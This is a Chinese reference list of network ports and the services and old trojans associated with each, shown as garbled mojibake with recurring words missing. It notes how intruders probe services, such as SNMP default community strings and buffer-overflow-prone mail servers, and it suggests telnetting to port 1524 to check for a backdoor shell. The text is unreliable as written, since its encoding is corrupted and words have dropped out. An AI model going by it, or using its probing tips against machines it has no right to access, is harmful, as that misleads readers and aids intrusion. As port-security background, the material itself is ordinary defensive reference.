Telnet<br>  è¿œç¨‹ç™»å½•ï¼Œå…¥ä¾µè€…åœ¨æœç´¢è¿œç¨‹ç™»å½•UNIXçš„ ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹æ‰«æè¿™ä¸€ æ˜¯ä¸ºäº†æ‰¾åˆ°æœºå™¨è¿è¡Œçš„æ“ä½œç³»ç»Ÿã€‚è¿˜æœ‰ä½¿ç”¨å…¶ä»–æŠ€æœ¯ï¼Œå…¥ä¾µè€…ä¹Ÿä¼šæ‰¾åˆ°å¯†ç ã€‚æœ¨é©¬Tiny Telnet Serverå°±å¼€æ”¾è¿™ä¸ª ã€‚</p><p>  25<br>  SMTP<br>  SMTP å™¨æ‰€å¼€æ”¾çš„ ï¼Œç”¨äºå‘é€é‚®ä»¶ã€‚å…¥ä¾µè€…å¯»æ‰¾SMTP å™¨æ˜¯ä¸ºäº†ä¼ é€’ä»–ä»¬çš„SPAMã€‚å…¥ä¾µè€…çš„å¸æˆ·è¢«å…³é—­ï¼Œä»–ä»¬éœ€è¦è¿æ¥åˆ°é«˜å¸¦å®½çš„E-MAIL å™¨ä¸Šï¼Œå°†ç®€å•çš„ä¿¡æ¯ä¼ é€’åˆ°ä¸åŒçš„åœ°å€ã€‚æœ¨é©¬Antigenã€Email Password Senderã€Haebu Cocedaã€Shtrilitz Stealthã€WinPCã€WinSpyéƒ½å¼€æ”¾è¿™ä¸ª ã€‚</p><p>  31<br>  MSG Authentication<br>  æœ¨é©¬Master Paradiseã€Hackers Paradiseå¼€æ”¾æ­¤ ã€‚</p><p>  42<br>  WINS Replication<br>  WINSå¤åˆ¶</p><p>  53<br>  Domain Name Serverï¼ˆDNSï¼‰<br>  DNS å™¨æ‰€å¼€æ”¾çš„ ï¼Œå…¥ä¾µè€…å¯èƒ½æ˜¯è¯•å›¾è¿›è¡ŒåŒºåŸŸä¼ é€’ï¼ˆTCPï¼‰ï¼Œæ¬ºéª—DNSï¼ˆUDPï¼‰æˆ–éšè—å…¶ä»–çš„é€šä¿¡ã€‚å› æ­¤é˜²ç«å¢™å¸¸å¸¸è¿‡æ»¤æˆ–è®°å½•æ­¤ ã€‚</p><p>  67<br>  Bootstrap Protocol Server<br>  é€šè¿‡DSLå’ŒCable modemçš„é˜²ç«å¢™å¸¸ä¼šçœ‹è§å¤§é‡å‘é€åˆ°å¹¿æ’­åœ°å€255.255.255.255çš„æ•°æ®ã€‚è¿™äº›æœºå™¨åœ¨å‘DHCP å™¨è¯·æ±‚ä¸€ä¸ªåœ°å€ã€‚HACKERå¸¸è¿›å…¥å®ƒä»¬ï¼Œåˆ†é…ä¸€ä¸ªåœ°å€æŠŠè‡ªå·±ä½œä¸ºå±€éƒ¨è·¯ç”±å™¨è€Œå‘èµ·å¤§é‡ä¸­é—´äººï¼ˆman-in-middleï¼‰æ”»å‡»ã€‚å®¢æˆ·ç«¯å‘68 å¹¿æ’­è¯·æ±‚é…ç½®ï¼Œ å™¨å‘67 å¹¿æ’­å›åº”è¯·æ±‚ã€‚è¿™ç§å›åº”ä½¿ç”¨å¹¿æ’­æ˜¯å› ä¸ºå®¢æˆ·ç«¯è¿˜ä¸çŸ¥é“å¯ä»¥å‘é€çš„IPåœ°å€ã€‚</p><p>  69<br>  Trival File Transfer<br>  è®¸å¤š å™¨ä¸bootpä¸€èµ·æä¾›è¿™é¡¹ ï¼Œä¾¿äºä»ç³»ç»Ÿä¸‹è½½å¯åŠ¨ä»£ç ã€‚ä½†æ˜¯å®ƒä»¬å¸¸å¸¸ç”±äºé”™è¯¯é…ç½®è€Œä½¿å…¥ä¾µè€…èƒ½ä»ç³»ç»Ÿä¸­çªƒå–ä»»ä½• æ–‡ä»¶ã€‚å®ƒä»¬ä¹Ÿå¯ç”¨äºç³»ç»Ÿå†™å…¥æ–‡ä»¶ã€‚</p><p>  79<br>  Finger Server<br>  å…¥ä¾µè€…ç”¨äºè·å¾—ç”¨æˆ·ä¿¡æ¯ï¼ŒæŸ¥è¯¢æ“ä½œç³»ç»Ÿï¼Œæ¢æµ‹å·²çŸ¥çš„ç¼“å†²åŒºæº¢å‡ºé”™è¯¯ï¼Œå›åº”ä»è‡ªå·±æœºå™¨åˆ°å…¶ä»–æœºå™¨Fingeræ‰«æã€‚</p><p>  80<br>  HTTP<br>  ç”¨äºç½‘é¡µæµè§ˆã€‚æœ¨é©¬Executorå¼€æ”¾æ­¤ ã€‚</p><p>  99<br>  Metagram Relay<br>  åé—¨ç¨‹åºncx99å¼€æ”¾æ­¤ ã€‚</p><p>  102<br>  Message transfer agent(MTA)-X.400 over TCP/IP<br>  æ¶ˆæ¯ä¼ è¾“ä»£ç†ã€‚</p><p>  109<br>  Post Office Protocol -Version3<br>  POP3 å™¨å¼€æ”¾æ­¤ ï¼Œç”¨äºæ¥æ”¶é‚®ä»¶ï¼Œå®¢æˆ·ç«¯è®¿é—® å™¨ç«¯çš„é‚®ä»¶ ã€‚POP3 æœ‰è®¸å¤šå…¬è®¤çš„å¼±ç‚¹ã€‚å…³äºç”¨æˆ·åå’Œå¯†ç äº¤ æ¢ç¼“å†²åŒºæº¢å‡ºçš„å¼±ç‚¹è‡³å°‘æœ‰20ä¸ªï¼Œè¿™æ„å‘³ç€å…¥ä¾µè€…å¯ä»¥åœ¨çœŸæ­£ç™»é™†å‰è¿›å…¥ç³»ç»Ÿã€‚æˆåŠŸç™»é™†åè¿˜æœ‰å…¶ä»–ç¼“å†²åŒºæº¢å‡ºé”™è¯¯ã€‚</p><p>  110<br>  SUNå…¬å¸çš„RPC æ‰€æœ‰<br>  å¸¸è§RPC æœ‰rpc.mountdã€NFSã€rpc.statdã€rpc.csmdã€rpc.ttybdã€amdç­‰</p><p>  113<br>  Authentication Service<br>  è¿™æ˜¯ä¸€ä¸ªè®¸å¤šè®¡ç®—æœºä¸Šè¿è¡Œçš„åè®®ï¼Œç”¨äºé‰´åˆ«TCPè¿æ¥çš„ç”¨æˆ·ã€‚ä½¿ç”¨æ ‡å‡†çš„è¿™ç§ å¯ä»¥è·å¾—è®¸å¤šè®¡ç®—æœºçš„ä¿¡æ¯ã€‚ä½†æ˜¯å®ƒå¯ä½œä¸ºè®¸å¤š çš„è®°å½•å™¨ï¼Œå°¤å…¶æ˜¯FTPã€POPã€IMAPã€SMTPå’ŒIRCç­‰ ã€‚é€šå¸¸å¦‚æœæœ‰è®¸å¤šå®¢æˆ·é€šè¿‡é˜²ç«å¢™è®¿é—®è¿™äº› ï¼Œå°†ä¼šçœ‹åˆ°è®¸å¤šè¿™ä¸ª çš„è¿æ¥è¯·æ±‚ã€‚è®°ä½ï¼Œå¦‚æœé˜»æ–­è¿™ä¸ª å®¢æˆ·ç«¯ä¼šæ„Ÿè§‰åˆ°åœ¨é˜²ç«å¢™å¦ä¸€è¾¹ä¸E-MAIL å™¨çš„ç¼“æ…¢è¿æ¥ã€‚è®¸å¤šé˜²ç«å¢™æ”¯æŒTCPè¿æ¥çš„é˜»æ–­è¿‡ç¨‹ä¸­å‘å›RSTã€‚è¿™å°†ä¼šåœæ­¢ç¼“æ…¢çš„è¿æ¥ã€‚</p><p>  119<br>  Network News Transfer Protocol<br>  NEWSæ–°é—»ç»„ä¼ è¾“åè®®ï¼Œæ‰¿è½½USENETé€šä¿¡ã€‚è¿™ä¸ª çš„è¿æ¥é€šå¸¸æ˜¯äººä»¬åœ¨å¯»æ‰¾USENET å™¨ã€‚å¤šæ•°ISPé™åˆ¶ï¼Œåªæœ‰ä»–ä»¬çš„å®¢æˆ·æ‰èƒ½è®¿é—®ä»–ä»¬çš„æ–°é—»ç»„ å™¨ã€‚æ‰“å¼€æ–°é—»ç»„ å™¨å°†å…è®¸å‘/è¯»ä»»ä½•äººçš„å¸–å­ï¼Œè®¿é—®è¢«é™åˆ¶çš„æ–°é—»ç»„ å™¨ï¼ŒåŒ¿åå‘å¸–æˆ–å‘é€SPAMã€‚</p><p>  135<br>  Location Service<br>  Microsoftåœ¨è¿™ä¸ª è¿è¡ŒDCE RPC end-point mapperä¸ºå®ƒçš„DCOM ã€‚è¿™ä¸UNIX 111 çš„åŠŸèƒ½å¾ˆç›¸ä¼¼ã€‚ä½¿ç”¨DCOMå’ŒRPCçš„ åˆ©ç”¨è®¡ç®—æœºä¸Šçš„end-point mapperæ³¨å†Œå®ƒä»¬çš„ä½ç½®ã€‚è¿œç«¯å®¢æˆ·è¿æ¥åˆ°è®¡ç®—æœºæ—¶ï¼Œå®ƒä»¬æŸ¥æ‰¾end-point mapperæ‰¾åˆ° çš„ä½ç½®ã€‚HACKERæ‰«æè®¡ç®—æœºçš„è¿™ä¸ª æ˜¯ä¸ºäº†æ‰¾åˆ°è¿™ä¸ªè®¡ç®—æœºä¸Šè¿è¡ŒExchange Serverå—ï¼Ÿä»€ä¹ˆç‰ˆæœ¬ï¼Ÿè¿˜æœ‰äº›DOSæ”»å‡»ç›´æ¥é’ˆå¯¹è¿™ä¸ª ã€‚</p><p>  137ã€138ã€139<br>  NETBIOS Name Service<br>  å…¶ä¸­137ã€138æ˜¯UDP ï¼Œå½“é€šè¿‡ç½‘ä¸Šé‚»å±…ä¼ è¾“æ–‡ä»¶æ—¶ç”¨è¿™ä¸ª ã€‚è€Œ139  é€šè¿‡è¿™ä¸ª è¿›å…¥çš„è¿æ¥è¯•å›¾è·å¾—NetBIOS/SMB ã€‚è¿™ä¸ªåè®®è¢«ç”¨äºwindowsæ–‡ä»¶å’Œæ‰“å°æœºå…±äº«å’ŒSAMBAã€‚è¿˜æœ‰WINS Regisrtationä¹Ÿç”¨å®ƒã€‚</p><p>  143<br>  Interim Mail Access Protocol v2<br>  å’ŒPOP3çš„å®‰å…¨é—®é¢˜ä¸€æ ·ï¼Œè®¸å¤šIMAP å™¨å­˜åœ¨æœ‰ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚è®°ä½ ä¸€ç§LINUXè •è™«ï¼ˆadmv0rmï¼‰ä¼šé€šè¿‡è¿™ä¸ª ç¹æ®–ï¼Œå› æ­¤è®¸å¤šè¿™ä¸ª çš„æ‰«ææ¥è‡ªä¸çŸ¥æƒ…çš„å·²ç»è¢«æ„ŸæŸ“çš„ç”¨æˆ·ã€‚å½“REDHATåœ¨ä»–ä»¬çš„LINUXå‘å¸ƒç‰ˆæœ¬ä¸­é»˜è®¤å…è®¸IMAPåï¼Œè¿™äº›æ¼æ´å˜çš„å¾ˆæµè¡Œã€‚è¿™ä¸€ è¿˜è¢«ç”¨äºIMAP2ï¼Œä½†å¹¶ä¸æµè¡Œã€‚</p><p>  161<br>  SNMP<br>  SNMPå…è®¸è¿œç¨‹ç®¡ç†è®¾å¤‡ã€‚æ‰€æœ‰é…ç½®å’Œè¿è¡Œä¿¡æ¯çš„å‚¨å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œé€šè¿‡SNMPå¯è·å¾—è¿™äº›ä¿¡æ¯ã€‚è®¸å¤šç®¡ç†å‘˜çš„é”™è¯¯é…ç½®å°†è¢«æš´éœ²åœ¨Internetã€‚Cackerså°†è¯•å›¾ä½¿ç”¨é»˜è®¤çš„å¯†ç publicã€privateè®¿é—®ç³»ç»Ÿã€‚ä»–ä»¬å¯èƒ½ä¼šè¯•éªŒæ‰€æœ‰å¯èƒ½çš„ç»„åˆã€‚SNMPåŒ…å¯èƒ½ä¼šè¢«é”™è¯¯çš„æŒ‡å‘ç”¨æˆ·çš„ç½‘ç»œã€‚</p><p>  177<br>  X Display Manager Control Protocol<br>  è®¸å¤šå…¥ä¾µè€…é€šè¿‡å®ƒè®¿é—®X-windowsæ“ä½œå°ï¼Œå®ƒåŒæ—¶éœ€è¦æ‰“å¼€6000 ã€‚</p><p>  389<br>  LDAPã€ILS<br>  è½»å‹ç›®å½•è®¿é—®åè®®å’ŒNetMeeting Internet Locator Serverå…±ç”¨è¿™ä¸€ ã€‚</p><p>  443<br>  Https<br>  ç½‘é¡µæµè§ˆ ï¼Œèƒ½æä¾›åŠ å¯†å’Œé€šè¿‡å®‰å…¨ ä¼ è¾“çš„å¦ä¸€ç§HTTPã€‚</p><p>  456<br>  [NULL]<br>  æœ¨é©¬HACKERS PARADISEå¼€æ”¾æ­¤ ã€‚</p><p>  513<br>  Login,remote login<br>  æ˜¯ä»ä½¿ç”¨cable modemæˆ–DSLç™»é™†åˆ°å­ç½‘ä¸­çš„UNIXè®¡ç®—æœºå‘å‡ºçš„å¹¿æ’­ã€‚è¿™äº›äººä¸ºå…¥ä¾µè€…è¿›å…¥ä»–ä»¬çš„ç³»ç»Ÿæä¾›äº†ä¿¡æ¯ã€‚</p><p>  544<br>  [NULL]<br>  kerberos kshell</p><p>  548<br>  Macintosh,File Services(AFP/IP)<br>  Macintosh,æ–‡ä»¶ ã€‚</p><p>  553<br>  CORBA IIOP ï¼ˆUDPï¼‰<br>  ä½¿ç”¨cable modemã€DSLæˆ–VLANå°†ä¼šçœ‹åˆ°è¿™ä¸ª çš„å¹¿æ’­ã€‚CORBAæ˜¯ä¸€ç§é¢å‘å¯¹è±¡çš„RPCç³»ç»Ÿã€‚å…¥ä¾µè€…å¯ä»¥åˆ©ç”¨è¿™äº›ä¿¡æ¯è¿›å…¥ç³»ç»Ÿã€‚</p><p>  555<br>  DSF<br>  æœ¨é©¬PhAse1.0ã€Stealth Spyã€IniKillerå¼€æ”¾æ­¤ ã€‚</p><p>  568<br>  Membership DPA<br>  æˆå‘˜èµ„æ ¼ DPAã€‚</p><p>  569<br>  Membership MSN<br>  æˆå‘˜èµ„æ ¼ MSNã€‚</p><p>  635<br>  mountd<br>  Linuxçš„mountd Bugã€‚è¿™æ˜¯æ‰«æçš„ä¸€ä¸ªæµè¡ŒBUGã€‚å¤§å¤šæ•°å¯¹è¿™ä¸ª çš„æ‰«ææ˜¯åŸºäºUDPçš„ï¼Œä½†æ˜¯åŸºäºTCPçš„mountdæœ‰æ‰€å¢åŠ ï¼ˆmountdåŒæ—¶è¿è¡Œäºä¸¤ä¸ª ï¼‰ã€‚è®°ä½mountdå¯è¿è¡Œäºä»»ä½• ï¼ˆåˆ°åº•æ˜¯å“ªä¸ª ï¼Œéœ€è¦åœ¨ 111åšportmapæŸ¥è¯¢ï¼‰ï¼Œåªæ˜¯Linuxé»˜è®¤ æ˜¯635ï¼Œå°±åƒNFSé€šå¸¸è¿è¡Œäº2049 ã€‚</p><p>  636<br>  LDAP<br>  SSLï¼ˆSecure Sockets layerï¼‰</p><p>  666<br>  Doom Id Software<br>  æœ¨é©¬Attack FTPã€Satanz Backdoorå¼€æ”¾æ­¤ </p><p>  993<br>  IMAP<br>  SSLï¼ˆSecure Sockets layerï¼‰</p><p>  1001ã€1011<br>  [NULL]<br>  æœ¨é©¬Silencerã€WebExå¼€æ”¾1001 ã€‚æœ¨é©¬Doly Trojanå¼€æ”¾1011 ã€‚</p><p>  1024<br>  Reserved<br>  å®ƒæ˜¯åŠ¨æ€ çš„å¼€å§‹ï¼Œè®¸å¤šç¨‹åºå¹¶ä¸åœ¨ä¹ç”¨å“ªä¸ª è¿æ¥ç½‘ç»œï¼Œå®ƒä»¬è¯·æ±‚ç³»ç»Ÿä¸ºå®ƒä»¬åˆ†é…ä¸‹ä¸€ä¸ªé—²ç½® ã€‚åŸºäºè¿™ä¸€ç‚¹åˆ†é…ä» 1024å¼€å§‹ã€‚è¿™å°±æ˜¯è¯´ç¬¬ä¸€ä¸ªå‘ç³»ç»Ÿå‘å‡ºè¯·æ±‚çš„ä¼šåˆ†é…åˆ°1024 ã€‚ä½ å¯ä»¥é‡å¯æœºå™¨ï¼Œæ‰“å¼€Telnetï¼Œå†æ‰“å¼€ä¸€ä¸ªçª—å£è¿è¡Œnatstat -a å°†ä¼šçœ‹åˆ°Telnetè¢«åˆ†é…1024 ã€‚è¿˜æœ‰SQL sessionä¹Ÿç”¨æ­¤ å’Œ5000 ã€‚</p><p>  1025ã€1033<br>  1025 network blackjack 1033 [NULL]<br>  æœ¨é©¬netspyå¼€æ”¾è¿™2ä¸ª ã€‚</p><p>  1080<br>  SOCKS<br>  è¿™ä¸€åè®®ä»¥é€šé“æ–¹å¼ç©¿è¿‡é˜²ç«å¢™ï¼Œå…è®¸é˜²ç«å¢™åé¢çš„äººé€šè¿‡ä¸€ä¸ªIPåœ°å€è®¿é—®INTERNETã€‚ç†è®ºä¸Šå®ƒåº”è¯¥åªå…è®¸å†…éƒ¨çš„é€šä¿¡å‘å¤–åˆ°è¾¾INTERNETã€‚ä½†æ˜¯ç”±äºé”™è¯¯çš„é…ç½®ï¼Œå®ƒä¼šå…è®¸ä½äºé˜²ç«å¢™å¤–éƒ¨çš„æ”»å‡»ç©¿è¿‡é˜²ç«å¢™ã€‚WinGateå¸¸ä¼šå‘ç”Ÿè¿™ç§é”™è¯¯ï¼Œåœ¨åŠ å…¥IRCèŠå¤©å®¤æ—¶å¸¸ä¼šçœ‹åˆ°è¿™ç§æƒ…å†µã€‚<br>  1170<br>  [NULL]<br>  æœ¨é©¬Streaming Audio Trojanã€Psyber Stream Serverã€Voiceå¼€æ”¾æ­¤ ã€‚</p><p>  1234ã€1243ã€6711ã€6776<br>  [NULL]<br>  æœ¨é©¬SubSeven2.0ã€Ultors Trojanå¼€æ”¾1234ã€6776 ã€‚æœ¨é©¬SubSeven1.0/1.9å¼€æ”¾1243ã€6711ã€6776 ã€‚</p><p>  1245<br>  [NULL]<br>  æœ¨é©¬Vodooå¼€æ”¾æ­¤ ã€‚</p><p>  1433<br>  SQL<br>  Microsoftçš„SQL å¼€æ”¾çš„ ã€‚</p><p>  1492<br>  stone-design-1<br>  æœ¨é©¬FTP99CMPå¼€æ”¾æ­¤ ã€‚</p><p>  1500<br>  RPC client fixed port session queries<br>  RPCå®¢æˆ·å›ºå®š ä¼šè¯æŸ¥è¯¢</p><p>  1503<br>  NetMeeting T.120<br>  NetMeeting T.120</p><p>  1524<br>  ingress<br>  è®¸å¤šæ”»å‡»è„šæœ¬å°†å®‰è£…ä¸€ä¸ªåé—¨SHELLäºè¿™ä¸ª ï¼Œå°¤å…¶æ˜¯é’ˆå¯¹SUNç³»ç»Ÿä¸­Sendmailå’ŒRPC æ¼æ´çš„è„šæœ¬ã€‚å¦‚æœåˆšå®‰è£…äº†é˜²ç«å¢™å°±çœ‹åˆ°åœ¨è¿™ä¸ª ä¸Šçš„è¿æ¥ä¼å›¾ï¼Œå¾ˆå¯èƒ½æ˜¯ä¸Šè¿°åŸå› ã€‚å¯ä»¥è¯•è¯•Telnetåˆ°ç”¨æˆ·çš„è®¡ç®—æœºä¸Šçš„è¿™ä¸ª ï¼Œçœ‹çœ‹å®ƒæ˜¯å¦ä¼šç»™ä½ ä¸€ä¸ªSHELLã€‚è¿æ¥åˆ°600/pcserverä¹Ÿå­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚</p><p>  1600<br>  issd<br>  æœ¨é©¬Shivka-Burkaå¼€æ”¾æ­¤ ã€‚</p><p>  1720<br>  NetMeeting<br>  NetMeeting H.233 call Setupã€‚</p><p>  1731<br>  NetMeeting Audio Call Control<br>  NetMeetingéŸ³é¢‘è°ƒç”¨æ§åˆ¶ã€‚</p><p>  1807<br>  [NULL]<br>  æœ¨é©¬SpySenderå¼€æ”¾æ­¤ ã€‚</p><p>  1981<br>  [NULL]<br>  æœ¨é©¬ShockRaveå¼€æ”¾æ­¤ ã€‚</p><p>  1999<br>  cisco identification port<br>  æœ¨é©¬BackDoorå¼€æ”¾æ­¤ ã€‚</p><p>  2000<br>  [NULL]<br>  æœ¨é©¬GirlFriend 1.3ã€Millenium 1.0å¼€æ”¾æ­¤ ã€‚</p><p>  2001<br>  [NULL]<br>  æœ¨é©¬Millenium 1.0ã€Trojan Cowå¼€æ”¾æ­¤ ã€‚</p><p>  2023<br>  xinuexpansion 4<br>  æœ¨é©¬Pass Ripperå¼€æ”¾æ­¤ ã€‚</p><p>  2049<br>  NFS<br>  NFSç¨‹åºå¸¸è¿è¡Œäºè¿™ä¸ª ã€‚é€šå¸¸éœ€è¦è®¿é—®PortmapperæŸ¥è¯¢è¿™ä¸ª è¿è¡Œäºå“ªä¸ª ã€‚</p><p>  2115<br>  [NULL]<br>  æœ¨é©¬Bugså¼€æ”¾æ­¤ ã€‚</p><p>  2140ã€3150<br>  [NULL]<br>  æœ¨é©¬Deep Throat 1.0/3.0å¼€æ”¾æ­¤ ã€‚</p><p>  2500<br>  RPC client using a fixed port session replication<br>  åº”ç”¨å›ºå®š ä¼šè¯å¤åˆ¶çš„RPCå®¢æˆ·</p><p>  2583<br>  [NULL]<br>  æœ¨é©¬Wincrash 2.0å¼€æ”¾æ­¤ ã€‚</p><p>  2801<br>  [NULL]<br>  æœ¨é©¬Phineas Phuckerå¼€æ”¾æ­¤ ã€‚</p><p>  3024ã€4092<br>  [NULL]<br>  æœ¨é©¬WinCrashå¼€æ”¾æ­¤ ã€‚</p><p>  3128<br>  squid<br>  è¿™æ˜¯squid HTTPä»£ç† å™¨çš„é»˜è®¤ ã€‚æ”»å‡»è€…æ‰«æè¿™ä¸ª æ˜¯ä¸ºäº†æœå¯»ä¸€ä¸ªä»£ç† å™¨è€ŒåŒ¿åè®¿é—®Internetã€‚ä¹Ÿä¼šçœ‹åˆ°æœç´¢å…¶ä»–ä»£ç† å™¨çš„ 8000ã€8001ã€8080ã€8888ã€‚æ‰«æè¿™ä¸ª çš„å¦ä¸€ä¸ªåŸå› æ˜¯ç”¨æˆ·æ­£åœ¨è¿›å…¥èŠå¤©å®¤ã€‚å…¶ä»–ç”¨æˆ·ä¹Ÿä¼šæ£€éªŒè¿™ä¸ª ä»¥ç¡®å®šç”¨æˆ·çš„æœºå™¨æ˜¯å¦æ”¯æŒä»£ç†ã€‚</p><p>  3129<br>  [NULL]<br>  æœ¨é©¬Master Paradiseå¼€æ”¾æ­¤ ã€‚</p><p>  3150<br>  [NULL]<br>  æœ¨é©¬The Invasorå¼€æ”¾æ­¤ ã€‚</p><p>  3210ã€4321<br>  [NULL]<br>  æœ¨é©¬SchoolBuså¼€æ”¾æ­¤ </p><p> 3306<br>  [NULL]<br>  mysql</p><p>  3333<br>  dec-notes<br>  æœ¨é©¬Prosiakå¼€æ”¾æ­¤ </p><p>  3389<br>  è¶…çº§ç»ˆç«¯<br>  WINDOWS 2000ç»ˆç«¯å¼€æ”¾æ­¤ ã€‚</p><p>  3700<br>  [NULL]<br>  æœ¨é©¬Portal of Doomå¼€æ”¾æ­¤ </p><p>  3996ã€4060<br>  [NULL]<br>  æœ¨é©¬RemoteAnythingå¼€æ”¾æ­¤ </p><p>  4000<br>  QQå®¢æˆ·ç«¯<br>  è…¾è®¯QQå®¢æˆ·ç«¯å¼€æ”¾æ­¤ ã€‚</p><p>  4092<br>  [NULL]<br>  æœ¨é©¬WinCrashå¼€æ”¾æ­¤ ã€‚</p><p>  4590<br>  [NULL]<br>  æœ¨é©¬ICQTrojanå¼€æ”¾æ­¤ ã€‚</p><p>  5000ã€5001ã€5321ã€50505<br>  [NULL]<br>  æœ¨é©¬blazer5å¼€æ”¾5000 ã€‚æœ¨é©¬Sockets de Troieå¼€æ”¾5000ã€5001ã€5321ã€50505 ã€‚</p><p>  5400ã€5401ã€5402<br>  [NULL]<br>  æœ¨é©¬Blade Runnerå¼€æ”¾æ­¤ ã€‚</p><p>  5550<br>  [NULL]<br>  æœ¨é©¬xtcpå¼€æ”¾æ­¤ ã€‚</p><p>  5569<br>  [NULL]<br>  æœ¨é©¬Robo-Hackå¼€æ”¾æ­¤ ã€‚</p><p>  5632<br>  pcAnywere<br>  æœ‰æ—¶ä¼šçœ‹åˆ°å¾ˆå¤šè¿™ä¸ª çš„æ‰«æï¼Œè¿™ä¾èµ–äºç”¨æˆ·æ‰€åœ¨çš„ä½ç½®ã€‚å½“ç”¨æˆ·æ‰“å¼€pcAnywereæ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨æ‰«æå±€åŸŸç½‘Cç±»ç½‘ä»¥å¯»æ‰¾å¯èƒ½çš„ä»£ç†ï¼ˆè¿™é‡Œçš„ä»£ç†æ˜¯æŒ‡agentè€Œä¸æ˜¯proxyï¼‰ã€‚å…¥ä¾µè€…ä¹Ÿä¼šå¯»æ‰¾å¼€æ”¾è¿™ç§ çš„è®¡ç®—æœºã€‚ï¼Œæ‰€ä»¥åº”è¯¥æŸ¥çœ‹è¿™ç§æ‰«æçš„æºåœ°å€ã€‚ä¸€äº›æœå¯»pcAnywereçš„æ‰«æåŒ…å¸¸å« 22çš„UDPæ•°æ®åŒ…ã€‚</p><p>  5742<br>  [NULL]<br>  æœ¨é©¬WinCrash1.03å¼€æ”¾æ­¤ ã€‚</p><p>  6267<br>  [NULL]<br>  æœ¨é©¬å¹¿å¤–å¥³ç”Ÿå¼€æ”¾æ­¤ ã€‚</p><p>  6400<br>  [NULL]<br>  æœ¨é©¬The tHingå¼€æ”¾æ­¤ ã€‚</p><p>  6670ã€6671<br>  [NULL]<br>  æœ¨é©¬Deep Throatå¼€æ”¾6670 ã€‚è€ŒDeep Throat 3.0å¼€æ”¾6671 ã€‚</p><p>  6883<br>  [NULL]<br>  æœ¨é©¬DeltaSourceå¼€æ”¾æ­¤ ã€‚</p><p>  6969<br>  [NULL]<br>  æœ¨é©¬Gatecrasherã€Priorityå¼€æ”¾æ­¤ ã€‚</p><p>  6970<br>  RealAudio<br>  RealAudioå®¢æˆ·å°†ä» å™¨çš„6970-7170çš„UDP æ¥æ”¶éŸ³é¢‘æ•°æ®æµã€‚è¿™æ˜¯ç”±TCP-7070 å¤–å‘æ§åˆ¶è¿æ¥è®¾ç½®çš„ã€‚</p><p>  7000<br>  [NULL]<br>  æœ¨é©¬Remote Grabå¼€æ”¾æ­¤ ã€‚</p><p>  7300ã€7301ã€7306ã€7307ã€7308<br>  [NULL]<br>  æœ¨é©¬NetMonitorå¼€æ”¾æ­¤ ã€‚å¦å¤–NetSpy1.0ä¹Ÿå¼€æ”¾7306 ã€‚</p><p>  7323<br>  [NULL]<br>  Sygate å™¨ç«¯ã€‚</p><p>  7626<br>  [NULL]<br>  æœ¨é©¬Giscierå¼€æ”¾æ­¤ ã€‚</p><p>  7789<br>  [NULL]<br>  æœ¨é©¬ICKillerå¼€æ”¾æ­¤ ã€‚</p><p>  8000<br>  OICQ<br>  è…¾è®¯QQ å™¨ç«¯å¼€æ”¾æ­¤ ã€‚</p><p>  8010<br>  Wingate<br>  Wingateä»£ç†å¼€æ”¾æ­¤ ã€‚</p><p>  8080<br>  ä»£ç†<br>  WWWä»£ç†å¼€æ”¾æ­¤ ã€‚</p><p>  9400ã€9401ã€9402<br>  [NULL]<br>  æœ¨é©¬Incommand 1.0å¼€æ”¾æ­¤ ã€‚</p><p>  9872ã€9873ã€9874ã€9875ã€10067ã€10167<br>  [NULL]<br>  æœ¨é©¬Portal of Doomå¼€æ”¾æ­¤ ã€‚</p><p>  9989<br>  [NULL]<br>  æœ¨é©¬iNi-Killerå¼€æ”¾æ­¤ ã€‚</p><p>  11000<br>  [NULL]<br>  æœ¨é©¬SennaSpyå¼€æ”¾æ­¤ ã€‚</p><p>  11223<br>  [NULL]<br>  æœ¨é©¬Progenic trojanå¼€æ”¾æ­¤ ã€‚</p><p>  12076ã€61466<br>  [NULL]<br>  æœ¨é©¬Telecommandoå¼€æ”¾æ­¤ ã€‚<br>page]<br>  12223<br>  [NULL]<br>  æœ¨é©¬Hackâ€™99 KeyLoggerå¼€æ”¾æ­¤ ã€‚</p><p>  12345ã€12346<br>  [NULL]<br>  æœ¨é©¬NetBus1.60/1.70ã€GabanBuså¼€æ”¾æ­¤ ã€‚</p><p>  12361<br>  [NULL]<br>  æœ¨é©¬Whack-a-moleå¼€æ”¾æ­¤ ã€‚</p><p>  13223<br>  PowWow<br>  PowWowæ˜¯Tribal Voiceçš„èŠå¤©ç¨‹åºã€‚å®ƒå…è®¸ç”¨æˆ·åœ¨æ­¤ æ‰“å¼€ç§äººèŠå¤©çš„è¿æ¥ã€‚è¿™ä¸€ç¨‹åºå¯¹äºå»ºç«‹è¿æ¥éå¸¸å…·æœ‰æ”»å‡»æ€§ã€‚å®ƒä¼šé©»æ‰åœ¨è¿™ä¸ªTCP ç­‰å›åº”ã€‚é€ æˆç±»ä¼¼å¿ƒè·³é—´éš”çš„è¿æ¥è¯·æ±‚ã€‚å¦‚æœä¸€ä¸ªæ‹¨å·ç”¨æˆ·ä»å¦ä¸€ä¸ªèŠå¤©è€…æ‰‹ä¸­ç»§æ‰¿äº†IPåœ°å€å°±ä¼šå‘ç”Ÿå¥½è±¡æœ‰å¾ˆå¤šä¸åŒçš„äººåœ¨æµ‹è¯•è¿™ä¸ª çš„æƒ…å†µã€‚è¿™ä¸€åè®®ä½¿ç”¨OPNGä½œä¸ºå…¶è¿æ¥è¯·æ±‚çš„å‰4ä¸ªå­—èŠ‚ã€‚</p><p>  16969<br>  [NULL]<br>  æœ¨é©¬Priorityå¼€æ”¾æ­¤ ã€‚</p><p>  17027<br>  Conducent<br>  è¿™æ˜¯ä¸€ä¸ªå¤–å‘è¿æ¥ã€‚è¿™æ˜¯ç”±äºå…¬å¸å†…éƒ¨æœ‰äººå®‰è£…äº†å¸¦æœ‰Conducentâ€adbotâ€çš„å…±äº«è½¯ä»¶ã€‚Conducentâ€adbotâ€æ˜¯ä¸ºå…±äº«è½¯ä»¶æ˜¾ç¤ºå¹¿å‘Š çš„ã€‚ä½¿ç”¨è¿™ç§ çš„ä¸€ç§æµè¡Œçš„è½¯ä»¶æ˜¯Pkwareã€‚</p><p>  19191<br>  [NULL]<br>  æœ¨é©¬è“è‰²ç«ç„°å¼€æ”¾æ­¤ ã€‚</p><p>  20000ã€20001<br>  [NULL]<br>  æœ¨é©¬Millenniumå¼€æ”¾æ­¤ 